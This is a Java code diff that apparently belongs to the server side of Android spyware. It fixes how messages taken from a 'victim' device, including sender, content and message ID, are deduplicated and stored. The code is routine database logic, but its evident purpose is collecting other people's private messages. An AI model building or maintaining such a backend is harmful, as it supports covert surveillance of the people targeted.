@@ -21,7 +21,7 @@ public class Messages extends BaseTable<Message> {
     private static final String COLUMN_CONTENT = "content";
     private static final String COLUMN_DELIVERY_TIME = "delivery_time";
     public static final String COLUMN_VICTIM_ID = "victim_id";
-    private static final String COLUMN_ANDROID_CONTACT_ID = "android_contact_id";
+    private static final String COLUMN_ANDROID_MESSAGE_ID = "android_message_id";
     private static final String COLUMN_TYPE = "_type";
     private static final String COLUMN_FROM = "_from";
     private static Messages instance = new Messages();
@@ -38,7 +38,7 @@ public class Messages extends BaseTable<Message> {
     @Override
     public void addv2(@Nullable String victimId, JSONArray jaArr) throws RuntimeException, JSONException {
 
-        final String existenceQuery = "SELECT id FROM messages WHERE _from = ? AND content = ? AND delivery_time = ? AND _type = ? AND victim_id = ? LIMIT 1";
+        final String existenceQuery = "SELECT id FROM messages WHERE _from = ? AND content = ? AND delivery_time = ? AND _type = ? AND victim_id = ? AND android_message_id = ? LIMIT 1";
         final String addQuery = "INSERT INTO messages (victim_id,android_message_id,_from,content,_type,delivery_time) VALUES (?,?,?,?,?,?);";
 
         final java.sql.Connection con = Connection.getConnection();
@@ -54,11 +54,12 @@ public class Messages extends BaseTable<Message> {
 
                 final JSONObject joMessage = jaArr.getJSONObject(i);
 
-                final String androidMessageId = joMessage.getString(COLUMN_ANDROID_CONTACT_ID);
+                final int androidMessageId = joMessage.getInt(COLUMN_ANDROID_MESSAGE_ID);
                 final String content = joMessage.getString(COLUMN_CONTENT);
                 final String type = joMessage.getString(COLUMN_TYPE);
                 final String from = joMessage.getString(COLUMN_FROM);
                 final long deliveryTime = joMessage.getLong(COLUMN_DELIVERY_TIME);
+
 
                 //Checking existence
                 existencePs.setString(1, from);
@@ -66,6 +67,7 @@ public class Messages extends BaseTable<Message> {
                 existencePs.setLong(3, deliveryTime);
                 existencePs.setString(4, type);
                 existencePs.setString(5, victimId);
+                existencePs.setInt(6, androidMessageId);
 
                 final ResultSet rs = existencePs.executeQuery();
                 final boolean isExists = rs.first();
@@ -73,7 +75,7 @@ public class Messages extends BaseTable<Message> {
 
                 if (!isExists) {
                     addPs.setString(1, victimId);
-                    addPs.setString(2, androidMessageId);
+                    addPs.setInt(2, androidMessageId);
                     addPs.setString(3, from);
                     addPs.setString(4, content);
                     addPs.setString(5, type);
